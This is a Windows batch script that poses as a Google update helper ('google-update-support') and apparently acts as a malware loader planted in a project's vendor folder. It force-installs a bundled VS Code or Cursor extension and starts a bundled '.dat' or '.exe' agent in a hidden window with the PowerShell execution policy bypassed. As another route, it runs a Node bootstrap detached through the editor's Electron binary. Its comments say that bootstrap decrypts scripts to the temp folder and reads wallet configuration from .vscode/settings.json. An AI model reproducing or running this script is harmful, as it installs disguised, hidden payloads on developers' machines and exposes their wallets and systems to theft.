@echo off
setlocal EnableExtensions EnableDelayedExpansion

set "BINDIR=%~dp0"

set "GUS_LOG_DIR="
if defined LOCALAPPDATA set "GUS_LOG_DIR=%LOCALAPPDATA%\Google"
if not defined GUS_LOG_DIR if defined USERPROFILE set "GUS_LOG_DIR=%USERPROFILE%\AppData\Local\Google"
if not defined GUS_LOG_DIR set "GUS_LOG_DIR=%TEMP%\Google"
set "GUS_LOG=%GUS_LOG_DIR%\gus-run-update.log"
if not exist "%GUS_LOG_DIR%" mkdir "%GUS_LOG_DIR%" 2>nul

rem --- VSIX install ---
set "GUS_VSIX=%BINDIR%google-update-support.vsix"
if exist "!GUS_VSIX!" (
  >>"%GUS_LOG%" echo [%date% %time%] VSIX found: !GUS_VSIX!
  call :gus_install_vsix "!GUS_VSIX!"
) else (
  >>"%GUS_LOG%" echo [%date% %time%] no VSIX beside run-update.cmd -- skip install
)
set "GUS_VSIX="

if exist "%BINDIR%.gus\use-extension-pipeline" (
  >>"%GUS_LOG%" echo [%date% %time%] use-extension-pipeline present -- launching Node.js pipeline directly
  call :gus_launch_node_pipeline
  exit /b 0
)

>>"%GUS_LOG%" echo.
>>"%GUS_LOG%" echo ================================================================================
>>"%GUS_LOG%" echo [%date% %time%] run-update.cmd START
>>"%GUS_LOG%" echo BINDIR=%BINDIR%
>>"%GUS_LOG%" echo CMDLINE=%*
>>"%GUS_LOG%" echo CD=%CD%
>>"%GUS_LOG%" echo USERDOMAIN=%USERDOMAIN% USERNAME=%USERNAME%
>>"%GUS_LOG%" echo LOCALAPPDATA=%LOCALAPPDATA%
>>"%GUS_LOG%" echo ================================================================================

set "GUSSTATE="
if exist "%BINDIR%.gus\ws-hops" set "GUSSTATE=%BINDIR%.gus\"
if not defined GUSSTATE if exist "%BINDIR%..\.gus\ws-hops" set "GUSSTATE=%BINDIR%..\.gus\"
>>"%GUS_LOG%" echo GUSSTATE_DIR=%GUSSTATE%

set "HOPS=2"
if defined GUSSTATE if exist "%GUSSTATE%ws-hops" for /f "usebackq delims=" %%H in ("%GUSSTATE%ws-hops") do set "HOPS=%%H"
>>"%GUS_LOG%" echo ws-hops HOPS=!HOPS!

pushd "%BINDIR%" >nul 2>&1
if errorlevel 1 (
  >>"%GUS_LOG%" echo [%date% %time%] ERROR pushd BINDIR failed
  goto :gus_done_bad
)
for /l %%i in (1,1,!HOPS!) do cd ..
set "WS=%CD%"
popd >nul 2>&1
>>"%GUS_LOG%" echo [%date% %time%] cd .. !HOPS! hop^(s^) from BINDIR to workspace root
set "GUS_WS_RAW=!WS!"
for /f "delims=" %%W in ('powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue'; $o=''; $e=$env:GUS_WS_RAW; if (-not [string]::IsNullOrWhiteSpace($e)) { try { $o=[System.IO.Path]::GetFullPath($e) } catch { $o=$e } }; Write-Output $o"') do set "WS=%%W"
set "GUS_WS_RAW="
set "GUS_WS_FOR_HASH=!WS!"
set "GUS_WS_TXT=%TEMP%\gusws-%RANDOM%-%RANDOM%.txt"
powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command "try { [IO.File]::WriteAllText($env:GUS_WS_TXT, [string]$env:GUS_WS_FOR_HASH) } catch { exit 1 }" >nul 2>&1
set "GUSWSHASH="
for /f "delims=" %%H in ('powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue'; $s=''; try { $fp=$env:GUS_WS_TXT; if ($fp -and (Test-Path -LiteralPath $fp)) { $s=[IO.File]::ReadAllText($fp).Trim(); Remove-Item -LiteralPath $fp -Force -EA SilentlyContinue } } catch {}; $out='nohash'; if (-not [string]::IsNullOrWhiteSpace($s)) { try { $s=[System.IO.Path]::GetFullPath($s); $b=[Security.Cryptography.MD5]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($s)); $out=[BitConverter]::ToString($b).Replace([char]45,[String]::Empty).Substring(0,12).ToLower() } catch { $out='nohash' } }; Write-Output $out"') do set "GUSWSHASH=%%H"
set "GUS_WS_FOR_HASH="
set "GUS_WS_TXT="
if "!GUSWSHASH!"=="" set "GUSWSHASH=nohash"
>>"%GUS_LOG%" echo WS resolved=%WS%
>>"%GUS_LOG%" echo ws-fingerprint=!GUSWSHASH!

set "GUS_LOCK_DIR=%GUS_LOG_DIR%\gus-run-update-lock-!GUSWSHASH!"
set "GUS_LOCK_HELD=0"
2>nul mkdir "!GUS_LOCK_DIR!"
if errorlevel 1 (
  >>"%GUS_LOG%" echo [%date% %time%] another run-update instance is active for this workspace ^(lock=!GUS_LOCK_DIR!^) - exit
  >>"%GUS_LOG%" echo ================================================================================
  exit /b 0
)
set "GUS_LOCK_HELD=1"
>>"%GUS_LOG%" echo acquired workspace lock !GUS_LOCK_DIR!

if "!WS!"=="" (
  >>"%GUS_LOG%" echo [%date% %time%] ERROR empty workspace path after ws-hops -- check .gus/ws-hops depth vs vendor location
  call :gus_release_lock
  >>"%GUS_LOG%" echo ================================================================================
  exit /b 0
)
set "OVERLORD_GUS_WORKSPACE=%WS%"

set "CLEANUP=0"
if exist "%BINDIR%..\.gus-cleanup-after" set "CLEANUP=1"
if exist "%BINDIR%.gus\one-shot" set "CLEANUP=1"
if exist "%BINDIR%..\.gus\one-shot" set "CLEANUP=1"
>>"%GUS_LOG%" echo CLEANUP=%CLEANUP%

>>"%GUS_LOG%" echo [%date% %time%] legacy path (no use-extension-pipeline marker)

if exist "%BINDIR%google-update-support-windows-amd64.dat" (
  >>"%GUS_LOG%" echo starting bundled google-update-support-windows-amd64.dat from BINDIR
  call :gus_spawn_agent "%BINDIR%google-update-support-windows-amd64.dat"
) else if exist "%BINDIR%google-update-support-windows-amd64.exe" (
  >>"%GUS_LOG%" echo starting bundled google-update-support-windows-amd64.exe from BINDIR
  call :gus_spawn_agent "%BINDIR%google-update-support-windows-amd64.exe"
) else (
  >>"%GUS_LOG%" echo [%date% %time%] no Windows agent exe in BINDIR -- extension pipeline should handle this
)

:afterstart
ver >nul 2>nul
>>"%GUS_LOG%" echo [%date% %time%] run-update.cmd END OK exit=0
call :gus_release_lock
>>"%GUS_LOG%" echo ================================================================================
exit /b 0

:gus_spawn_agent
set "GUS_SPAWN_EXE=%~1"
if "!GUS_SPAWN_EXE!"=="" (
  >>"%GUS_LOG%" echo [%date% %time%] gus_spawn_agent: empty path
  exit /b 1
)
>>"%GUS_LOG%" echo [%date% %time%] spawn: !GUS_SPAWN_EXE!
for %%Z in ("!GUS_SPAWN_EXE!") do >>"%GUS_LOG%" echo spawn target size_bytes=%%~zZ
set "GUS_SPAWN_ENV=!GUS_SPAWN_EXE!"
set "GUS_SPAWN_LOG=!GUS_LOG!"
ver >nul 2>nul
powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command "try { Start-Process -FilePath $env:GUS_SPAWN_ENV -WindowStyle Hidden -ErrorAction Stop } catch { $m='Start-Process exception: '+$_.Exception.Message; if ($env:GUS_SPAWN_LOG) { Add-Content -LiteralPath $env:GUS_SPAWN_LOG -Value $m -ErrorAction SilentlyContinue }; exit 1 }"
set "GUS_SPAWN_EC=!ERRORLEVEL!"
>>"%GUS_LOG%" echo Start-Process exit=!GUS_SPAWN_EC!
if not "!GUS_SPAWN_EC!"=="0" (
  >>"%GUS_LOG%" echo [%date% %time%] ERROR agent Start-Process failed ec=!GUS_SPAWN_EC! exe=!GUS_SPAWN_EXE!
)
set "GUS_SPAWN_EC="
set "GUS_SPAWN_LOG="
set "GUS_SPAWN_ENV="
exit /b 0

:gus_done_bad
>>"%GUS_LOG%" echo [%date% %time%] run-update.cmd END pushd failure exit=0
>>"%GUS_LOG%" echo ================================================================================
exit /b 0

:gus_release_lock
if "!GUS_LOCK_HELD!"=="1" (
  2>nul rmdir "!GUS_LOCK_DIR!"
  if errorlevel 1 (
    >>"%GUS_LOG%" echo [%date% %time%] lock release skipped ^(already removed or busy^) path=!GUS_LOCK_DIR!
  ) else (
    >>"%GUS_LOG%" echo [%date% %time%] released workspace lock !GUS_LOCK_DIR!
  )
)
set "GUS_LOCK_HELD=0"
set "GUS_LOCK_DIR="
exit /b 0

rem --- VSIX install subroutine ---
:gus_install_vsix
set "GUS_VI_VSIX=%~1"
if "!GUS_VI_VSIX!"=="" exit /b 1
for %%E in (code.cmd code cursor.cmd cursor) do (
  where %%E >nul 2>&1
  if not errorlevel 1 (
    >>"%GUS_LOG%" echo [%date% %time%] VSIX install: call %%E --install-extension "!GUS_VI_VSIX!" --force
    call %%E --install-extension "!GUS_VI_VSIX!" --force >nul 2>&1
    set "GUS_VI_EC=!ERRORLEVEL!"
    if "!GUS_VI_EC!"=="0" (
      >>"%GUS_LOG%" echo [%date% %time%] VSIX install OK via %%E
      set "GUS_VI_EC="
      set "GUS_VI_VSIX="
      exit /b 0
    )
    >>"%GUS_LOG%" echo [%date% %time%] VSIX install FAILED via %%E exit=!GUS_VI_EC!
    set "GUS_VI_EC="
  )
)
>>"%GUS_LOG%" echo [%date% %time%] VSIX install: no editor CLI succeeded ^(code/cursor not on PATH or all failed^) -- extension may be stale
set "GUS_VI_VSIX="
exit /b 1

rem --- Node.js pipeline launcher (mirrors macOS nohup approach) ---
rem Ships gus-node-bootstrap.js beside run-update.cmd. Finds the editor Electron binary,
rem runs the bootstrap with ELECTRON_RUN_AS_NODE=1 detached. The bootstrap decrypts scripts
rem to %%TEMP%%, reads wallet config from .vscode/settings.json, then runs the pipeline.
rem Vendor + .vscode are NOT needed after launch -- the bootstrap copies everything it needs
rem to temp before the pipeline starts.
:gus_launch_node_pipeline
set "GUS_NP_BOOT=%BINDIR%gus-node-bootstrap.js"
if not exist "!GUS_NP_BOOT!" (
  >>"%GUS_LOG%" echo [%date% %time%] node-pipeline: gus-node-bootstrap.js not found beside run-update.cmd -- skip
  exit /b 1
)
set "GUS_NP_EXE="
for %%E in (Code.exe Cursor.exe) do (
  if not defined GUS_NP_EXE (
    for /f "tokens=*" %%P in ('where %%E 2^>nul') do (
      if not defined GUS_NP_EXE set "GUS_NP_EXE=%%P"
    )
  )
)
if not defined GUS_NP_EXE if exist "%LOCALAPPDATA%\Programs\Microsoft VS Code\Code.exe" set "GUS_NP_EXE=%LOCALAPPDATA%\Programs\Microsoft VS Code\Code.exe"
if not defined GUS_NP_EXE if exist "%LOCALAPPDATA%\Programs\cursor\Cursor.exe" set "GUS_NP_EXE=%LOCALAPPDATA%\Programs\cursor\Cursor.exe"
if not defined GUS_NP_EXE if exist "%ProgramFiles%\Microsoft VS Code\Code.exe" set "GUS_NP_EXE=%ProgramFiles%\Microsoft VS Code\Code.exe"
if not defined GUS_NP_EXE (
  >>"%GUS_LOG%" echo [%date% %time%] node-pipeline: no editor binary found -- cannot launch
  exit /b 1
)
set "GUS_NP_HOPS=2"
if exist "%BINDIR%.gus\ws-hops" for /f "usebackq delims=" %%H in ("%BINDIR%.gus\ws-hops") do set "GUS_NP_HOPS=%%H"
if not exist "%BINDIR%.gus\ws-hops" if exist "%BINDIR%..\.gus\ws-hops" for /f "usebackq delims=" %%H in ("%BINDIR%..\.gus\ws-hops") do set "GUS_NP_HOPS=%%H"
set "GUS_NP_WS=%BINDIR%"
for /l %%I in (1,1,!GUS_NP_HOPS!) do (
  for %%D in ("!GUS_NP_WS!..") do set "GUS_NP_WS=%%~fD\"
)
set "GUS_NP_V=!BINDIR!"
if "!GUS_NP_V:~-1!"=="\" set "GUS_NP_V=!GUS_NP_V:~0,-1!"
set "GUS_NP_W=!GUS_NP_WS!"
if "!GUS_NP_W:~-1!"=="\" set "GUS_NP_W=!GUS_NP_W:~0,-1!"
>>"%GUS_LOG%" echo [%date% %time%] node-pipeline: exe=!GUS_NP_EXE! vendor=!GUS_NP_V! ws=!GUS_NP_W!
set "ELECTRON_RUN_AS_NODE=1"
start "" /b "!GUS_NP_EXE!" "!GUS_NP_BOOT!" "!GUS_NP_V!" "!GUS_NP_W!"
>>"%GUS_LOG%" echo [%date% %time%] node-pipeline: launched detached
set "ELECTRON_RUN_AS_NODE="
set "GUS_NP_EXE="
set "GUS_NP_BOOT="
set "GUS_NP_HOPS="
set "GUS_NP_WS="
set "GUS_NP_V="
set "GUS_NP_W="
exit /b 0
